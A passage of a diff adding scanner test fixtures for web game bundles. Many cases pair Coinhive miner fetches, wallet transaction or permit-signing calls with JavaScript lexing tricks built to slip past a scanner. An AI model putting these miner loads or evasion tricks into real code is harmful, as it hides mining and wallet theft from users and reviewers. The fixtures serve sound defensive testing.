+        "index.html": "<!doctype html><html><head><script>(function(h,o,t,j,a,r){h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};h._hjSettings={hjid:123,hjsv:6};a=o.getElementsByTagName(\"head\")[0];r=o.createElement(\"script\");r.async=1;r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;a.appendChild(r);})(window,document,\"https://static.hotjar.com/c/hotjar-\",\".js?sv=\");</script></head><body><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "g02_clarity",
+      "verdict": "blocker",
+      "why": "the official Clarity snippet",
+      "files": {
+        "game.js": "start();",
+        "index.html": "<!doctype html><html><head><script type=\"text/javascript\">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src=\"https://www.clarity.ms/tag/\"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, \"clarity\", \"script\", \"abc123\");</script></head><body><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "g03_pixel_img",
+      "verdict": "blocker",
+      "why": "an analytics pixel through new Image",
+      "files": {
+        "game.js": "new Image().src = \"https://www.google-analytics.com/collect?v=1&tid=UA-1&t=pageview\";",
+        "index.html": "<!doctype html><html><body><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "g04_beacon",
+      "verdict": "blocker",
+      "why": "sendBeacon to a form service",
+      "files": {
+        "game.js": "navigator.sendBeacon(\"https://formspree.io/f/abcd\", JSON.stringify({email}));",
+        "index.html": "<!doctype html><html><body><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "j01_js_href",
+      "verdict": "blocker",
+      "why": "an anchor's href set from script is a request by shape",
+      "files": {
+        "game.js": "const a=document.createElement(\"a\"); a.href=\"https://ko-fi.com/me\"; a.textContent=\"Support\"; credits.append(a);",
+        "index.html": "<!doctype html><html><body><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "firebase_analytics_gtag",
+      "verdict": "blocker",
+      "why": "Firebase analytics compat loads gtag from googletagmanager.com, an ad pixel host",
+      "files": {
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>",
+        "game.js": "var t=\"https://www.googletagmanager.com/gtag/js\";function i(e,n){const s=document.createElement(\"script\");s.src=`${t}?l=${e}&id=${n}`;document.head.appendChild(s)}"
+      }
+    },
+    {
+      "id": "a21_anchor",
+      "verdict": "warning",
+      "why": "an <a href> the frame never opens",
+      "files": {
+        "game.js": "start();",
+        "index.html": "<!doctype html><html><body><a href=\"https://ko-fi.com/mygame\" target=\"_blank\">Support me on Ko-fi</a><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "a24_ethers",
+      "verdict": "warning",
+      "why": "ethers is a crypto library: a warning, as the table says",
+      "files": {
+        "game.js": "const provider = new ethers.BrowserProvider(window.ethereum); await provider.send(\"eth_requestAccounts\", []);",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "b01_ts_source",
+      "verdict": "warning",
+      "why": "a shipped .ts the browser never runs",
+      "files": {
+        "game.js": "start();\n",
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>",
+        "src/pay.ts": "const stripe = Stripe(\"pk_live_abc123\"); export const wallet = window.ethereum;"
+      }
+    },
+    {
+      "id": "j02_innerhtml",
+      "verdict": "pass",
+      "why": "a credit link inside a sentence in a script",
+      "files": {
+        "game.js": "credits.innerHTML = `<p>Made by me. <a href=\"https://www.patreon.com/me\" target=\"_blank\">Patreon</a></p>`;",
+        "index.html": "<!doctype html><html><body><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "j03_credits_array",
+      "verdict": "warning",
+      "why": "a URL that is a value in an object",
+      "files": {
+        "game.js": "const CREDITS=[{name:\"Music by Kevin\",url:\"https://ko-fi.com/kevin\"},{name:\"Art\",url:\"https://www.patreon.com/artist\"}];",
+        "index.html": "<!doctype html><html><body><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "j04_license_comment",
+      "verdict": "pass",
+      "why": "a licence comment",
+      "files": {
+        "game.js": "/*! Support this project: https://www.patreon.com/foo https://ko-fi.com/foo  paypal.Buttons( */ start();",
+        "index.html": "<!doctype html><html><body><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "j05_funding_pkg",
+      "verdict": "pass",
+      "why": "a vendored package's funding field",
+      "files": {
+        "game.js": "var pkg={\"name\":\"lib\",\"funding\":{\"type\":\"patreon\",\"url\":\"https://www.patreon.com/foo\"}}; start();",
+        "index.html": "<!doctype html><html><body><script src=\"./game.js\"></script></body></html>"
+      }
+    },
+    {
+      "id": "package_link",
+      "verdict": "warning",
+      "why": "a link to a package page is a link",
+      "files": {
+        "index.html": "<!doctype html><html><body><a href=\"https://esm.sh/@stripe/stripe-js\">source</a><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>",
+        "game.js": "start();"
+      }
+    },
+    {
+      "id": "package_open_link",
+      "verdict": "warning",
+      "why": "og.openLink to a package page opens source code, not the service",
+      "files": {
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>",
+        "game.js": "og.openLink(\"https://unpkg.com/@walletconnect/web3-provider\");"
+      }
+    },
+    {
+      "id": "package_value",
+      "verdict": "warning",
+      "why": "a package URL that is a value in an object",
+      "files": {
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>",
+        "game.js": "const libs = {pay: \"https://esm.sh/@stripe/stripe-js\", n: 1};"
+      }
+    },
+    {
+      "id": "package_comment",
+      "verdict": "pass",
+      "why": "a package URL in a comment",
+      "files": {
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>",
+        "game.js": "// was: import(\"https://esm.sh/@stripe/stripe-js\")\nstart();"
+      }
+    },
+    {
+      "id": "package_allowed",
+      "verdict": "pass",
+      "why": "a package nobody blocks",
+      "files": {
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>",
+        "game.js": "import * as THREE from \"https://esm.sh/three@0.160\";"
+      }
+    },
+    {
+      "id": "package_combine",
+      "verdict": "blocker",
+      "why": "jsDelivr's combine form carrying a wallet SDK",
+      "files": {
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script><script src=\"https://cdn.jsdelivr.net/combine/npm/three@0.160,npm/@metamask/sdk@0.20\"></script></body></html>",
+        "game.js": "start();"
+      }
+    },
+    {
+      "id": "ts_source_package",
+      "verdict": "warning",
+      "why": "a blocked package in shipped source is a warning",
+      "files": {
+        "index.html": "<!doctype html><html><body><canvas></canvas><script type=\"module\" src=\"./game.js\"></script></body></html>",
+        "game.js": "start();",
+        "src/wallet.tsx": "import { createWeb3Modal } from \"https://esm.sh/@web3modal/wagmi\";\nexport const x = 1;\n"
+      }
+    },
+    {
+      "id": "r33_of_hides_a_miner",
+      "verdict": "blocker",
+      "why": "review R33: of, await and yield are not reserved, so a / after one opens a regex only if the pattern holds no quote, backtick, semicolon or parenthesis; the request after it stays visible",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var of=2;var z=of/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33_await_hides_stripe",
+      "verdict": "blocker",
+      "why": "review R33: of, await and yield are not reserved, so a / after one opens a regex only if the pattern holds no quote, backtick, semicolon or parenthesis; the request after it stays visible",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var await=2;var z=await/1;fetch(\"https://checkout.stripe.com/pay\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33_yield_hides_an_ad_network",
+      "verdict": "blocker",
+      "why": "review R33: of, await and yield are not reserved, so a / after one opens a regex only if the pattern holds no quote, backtick, semicolon or parenthesis; the request after it stays visible",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var yield=2;var z=yield/1;fetch(\"https://googlesyndication.com/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33_of_hides_a_signature",
+      "verdict": "blocker",
+      "why": "review R33: of, await and yield are not reserved, so a / after one opens a regex only if the pattern holds no quote, backtick, semicolon or parenthesis; the request after it stays visible",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var of=4;var h=of/2;Stripe(\"pk_live_abc\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33_plain_request_control",
+      "verdict": "blocker",
+      "why": "review R33's control: the same request with nothing in front of it",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33_f5_send_transaction",
+      "verdict": "blocker",
+      "why": "review R33 F5: an injected wallet sends the transaction with no host to refuse",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "window.ethereum.request({method:\"eth_sendTransaction\",params:[{to:t,value:v}]});"
+      }
+    },
+    {
+      "id": "r33_f5_sign_typed_data",
+      "verdict": "blocker",
+      "why": "review R33 F5: a typed-data signature is how a token permit is granted",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "provider.request({method:\"eth_signTypedData_v4\",params:[a,JSON.stringify(permit)]});"
+      }
+    },
+    {
+      "id": "r33b_f5_wallet_send_calls",
+      "verdict": "blocker",
+      "why": "review R33b: wallet_sendCalls (EIP-5792) sends a batch of transactions through an injected wallet, with no host to refuse",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "window.ethereum.request({method:\"wallet_sendCalls\",params:[{version:\"2.0.0\",calls:[{to:t,value:v}]}]});"
+      }
+    },
+    {
+      "id": "r33_f5_supabase_web3_signin_is_a_warning",
+      "verdict": "warning",
+      "why": "supabase-js carries eth_requestAccounts and personal_sign in signInWithWeb3 whether or not the game calls it",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function signInWithWeb3(w){const a=await w.request({method:\"eth_requestAccounts\"});return w.request({method:\"personal_sign\",params:[m,a[0]]})}"
+      }
+    },
+    {
+      "id": "r33b_n1_await_regex_with_semicolon",
+      "verdict": "blocker",
+      "why": "review R33b N1: after of, await or yield a / can be a pattern or a division, so the walk takes both and keeps only what both call inert; the misread that hid this request is no longer the only reading",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){await /;/;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33b_n1_yield_regex_with_paren",
+      "verdict": "blocker",
+      "why": "review R33b N1: after of, await or yield a / can be a pattern or a division, so the walk takes both and keeps only what both call inert; the misread that hid this request is no longer the only reading",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "function*g(){yield /(a)\\//;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33b_n2_property_after_space",
+      "verdict": "blocker",
+      "why": "review R33b N2: a reserved word is only a keyword when no . may come before it across space, line breaks or comments, and a combining mark or a joiner is part of the name; this request was hidden behind a property read as a keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a={return:2};var z=a. return/1;fetch(\"https://coinhive.com/lib/x.js\"); var q=1/1;"
+      }
+    },
+    {
+      "id": "r33b_n2_property_after_newline",
+      "verdict": "blocker",
+      "why": "review R33b N2: a reserved word is only a keyword when no . may come before it across space, line breaks or comments, and a combining mark or a joiner is part of the name; this request was hidden behind a property read as a keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a={return:2};var z=a.\nreturn/1;fetch(\"https://coinhive.com/lib/x.js\"); var q=1/1;"
+      }
+    },
+    {
+      "id": "r33b_n2_property_after_comment",
+      "verdict": "blocker",
+      "why": "review R33b N2: a reserved word is only a keyword when no . may come before it across space, line breaks or comments, and a combining mark or a joiner is part of the name; this request was hidden behind a property read as a keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a={return:2};var z=a./**/return/1;fetch(\"https://coinhive.com/lib/x.js\"); var q=1/1;"
+      }
+    },
+    {
+      "id": "r33b_n2_optional_chain_typeof",
+      "verdict": "blocker",
+      "why": "review R33b N2: a reserved word is only a keyword when no . may come before it across space, line breaks or comments, and a combining mark or a joiner is part of the name; this request was hidden behind a property read as a keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a={typeof:2};var z=a?. typeof/1;fetch(\"https://coinhive.com/lib/x.js\"); var q=1/1;"
+      }
+    },
+    {
+      "id": "r33b_n2_combining_mark",
+      "verdict": "blocker",
+      "why": "review R33b N2: a reserved word is only a keyword when no . may come before it across space, line breaks or comments, and a combining mark or a joiner is part of the name; this request was hidden behind a property read as a keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var áreturn=2;var z=áreturn/1;fetch(\"https://coinhive.com/lib/x.js\"); var q=1/1;"
+      }
+    },
+    {
+      "id": "r33b_n2_zero_width_joiner",
+      "verdict": "blocker",
+      "why": "review R33b N2: a reserved word is only a keyword when no . may come before it across space, line breaks or comments, and a combining mark or a joiner is part of the name; this request was hidden behind a property read as a keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var x‍return=2;var z=x‍return/1;fetch(\"https://coinhive.com/lib/x.js\"); var q=1/1;"
+      }
+    },
+    {
+      "id": "r33b_n3_line_separator",
+      "verdict": "blocker",
+      "why": "review R33b N3: JavaScript ends a // comment at CR, U+2028 and U+2029 as well as LF, and so does the walk; the request on the next line was hidden inside the comment",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a=1;// note fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33b_n3_paragraph_separator",
+      "verdict": "blocker",
+      "why": "review R33b N3: JavaScript ends a // comment at CR, U+2028 and U+2029 as well as LF, and so does the walk; the request on the next line was hidden inside the comment",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a=1;// note fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33b_n3_bare_cr",
+      "verdict": "blocker",
+      "why": "review R33b N3: JavaScript ends a // comment at CR, U+2028 and U+2029 as well as LF, and so does the walk; the request on the next line was hidden inside the comment",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a=1;// note\rfetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33b_n2_braced_escape",
+      "verdict": "blocker",
+      "why": "review R33b N2, beyond its own inputs: a \\u{61} escape before return makes one longer name, not the keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var \\u{61}return=2;var z=\\u{61}return/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33b_n2_middle_dot",
+      "verdict": "blocker",
+      "why": "review R33b N2, beyond its own inputs: U+00B7 is an identifier part (Other_ID_Continue) though it is punctuation",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var x·return=2;var z=x·return/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33b_n2_no_break_space_after_dot",
+      "verdict": "blocker",
+      "why": "review R33b N2, beyond its own inputs: a no-break space between . and the word is whitespace to JavaScript",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a={return:2};var z=a. return/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33b_n2_dot_in_a_comment_above_return",
+      "verdict": "blocker",
+      "why": "review R33b N2, beyond its own inputs: a . that ends a // comment on the line above is not a property access, so the pattern after return is still a pattern; reading it as division would meet // inside it",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "function f(s){// see a.\nreturn /a\\//.test(s);fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33b_n4_of_pattern_holds_a_miner_constructor",
+      "verdict": "blocker",
+      "why": "review R33b N4: the old guard took of/[...]/ for a pattern because it held no quote or parenthesis, and new CoinHive.Anonymous needs neither; the division reading sees it",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var of=1,m;var z=of/[m=new CoinHive.Anonymous]/1;m.start();"
+      }
+    },
+    {
+      "id": "r33b_n4_of_pattern_holds_a_wallet_key",
+      "verdict": "blocker",
+      "why": "review R33b N4: an unquoted object key needs no quote either, so eth_sendTransaction sat inside the would-be pattern",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var of=1,k;var z=of/[k={eth_sendTransaction:1}]/1;ethereum.request({method:Object.keys(k)[0],params:[]});"
+      }
+    },
+    {
+      "id": "r33b_n5_quote_without_paren",
+      "verdict": "blocker",
+      "why": "review R33b N5: a division after of followed by a quoted URL and no parenthesis; under the old guard only the quote kept it out of a pattern",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var of=2;var z=of/1;location=\"https://coinhive.com/x\";"
+      }
+    },
+    {
+      "id": "r33b_n5_single_quote",
+      "verdict": "blocker",
+      "why": "review R33b N5: the same with a single quote",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var of=2;var z=of/1;location='https://coinhive.com/x';"
+      }
+    },
+    {
+      "id": "r33b_n5_backtick",
+      "verdict": "blocker",
+      "why": "review R33b N5: the same with a backtick",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var of=2;var z=of/1;location=`https://coinhive.com/x`;"
+      }
+    },
+    {
+      "id": "r33c_r1_long_pattern_after_await_in_a_hole",
+      "verdict": "blocker",
+      "why": "review R33c R1: a pattern after await in a ${} hole is a pattern however long it is; read as division, the } inside it closed the hole and [// opened a shader comment over the request",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){return `${await /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}[//]x/,fetch(\"https://coinhive.com/lib/x.js\")}`}"
+      }
+    },
+    {
+      "id": "r33c_r1_long_pattern_after_yield_in_a_hole",
+      "verdict": "blocker",
+      "why": "review R33c R1: the same after yield",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "function*g(){return `${yield /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}[//]x/,fetch(\"https://coinhive.com/lib/x.js\")}`}"
+      }
+    },
+    {
+      "id": "r33c_r1_typeof_behind_a_long_comment_in_a_hole",
+      "verdict": "blocker",
+      "why": "review R33c R1: typeof opens a pattern in a hole even when a comment too long to look past sits in front of it; sent to the guess, the ( in the pattern made it division",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var s=`${/*cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc*/typeof /(})[//]x/,fetch(\"https://coinhive.com/lib/x.js\")}`;"
+      }
+    },
+    {
+      "id": "r33c_r1_typeof_behind_long_space_in_a_hole",
+      "verdict": "blocker",
+      "why": "review R33c R1: the same with a run of spaces too long to look past",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var s=`${0,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            typeof /(})[//]x/,fetch(\"https://coinhive.com/lib/x.js\")}`;"
+      }
+    },
+    {
+      "id": "r33c_r1_long_pattern_in_a_sink_hole",
+      "verdict": "blocker",
+      "why": "review R33c R1: the sink pass marks template text inert outright, so a hole closed early by a long pattern took the request with it and needed no comment at all",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){console.log(`${await /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}/,fetch(\"https://coinhive.com/lib/x.js\")}`)}"
+      }
+    },
+    {
+      "id": "r33c_r1_inline_script",
+      "verdict": "blocker",
+      "why": "review R33c R1: the first shape inside an inline script, which goes through the same walk",
+      "files": {
+        "index.html": "<!doctype html><script>async function f(){return `${await /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}[//]x/,fetch(\"https://coinhive.com/lib/x.js\")}`}</script>"
+      }
+    },
+    {
+      "id": "r33c_b1_await_comment_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; R33b N1 with /**/ added, read as division, took /;fetch(\"https:/ for a pattern",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){await/**//;/;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33c_b1_await_no_break_space_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; the same with no break space between await and the /",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){await /;/;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33c_b1_await_vertical_tab_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; the same with vertical tab between await and the /",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){await\u000b/;/;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33c_b1_await_byte_order_mark_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; the same with byte order mark between await and the /",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){await﻿/;/;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33c_b1_await_ideographic_space_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; the same with ideographic space between await and the /",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){await　/;/;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33c_b1_await_carriage_return_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; the same with carriage return between await and the /",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){await\r/;/;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33c_b1_await_line_separator_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; the same with line separator between await and the /",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){await /;/;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33c_b1_yield_vertical_tab_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; R33b N1 after yield with a vertical tab: division met // inside the pattern",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "function*g(){yield\u000b/(a)\\//;fetch(\"https://coinhive.com/lib/x.js\");}"
+      }
+    },
+    {
+      "id": "r33c_b1_return_comment_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; the same after return, a keyword, where division met // inside the pattern and lost the line",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "function f(s){return/**//a\\//}fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_b1_bracket_no_break_space_before_pattern",
+      "verdict": "blocker",
+      "why": "review R33c B1: the look-back before a / steps over every JavaScript whitespace character, and a comment or a line break in front means either reading; the same after punctuation: [ then a no-break space then a pattern",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var r=[ /a\\//];fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_b1_comment_nested_opener_before_keyword",
+      "verdict": "blocker",
+      "why": "review R33c: a */ before a keyword may close a comment that started after a ., and finding its opener backwards was fooled by a second /* inside it, so return was read as the keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a={return:2};var z=a./* x /* y */return/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33c_annex_b_html_open_comment_after_dot",
+      "verdict": "blocker",
+      "why": "review R33c, Annex B: <!-- opens a line comment in a classic script, so return after it is a property; a line break before a keyword now means it may be one",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a={return:2};var z=a.<!--\nreturn/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33c_annex_b_html_close_comment_after_dot",
+      "verdict": "blocker",
+      "why": "review R33c, Annex B: --> at the start of a line is a line comment, so return after it is still a property",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a={return:2};var z=a.\n-->\nreturn/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33c_b1_line_comment_between_dot_and_keyword",
+      "verdict": "blocker",
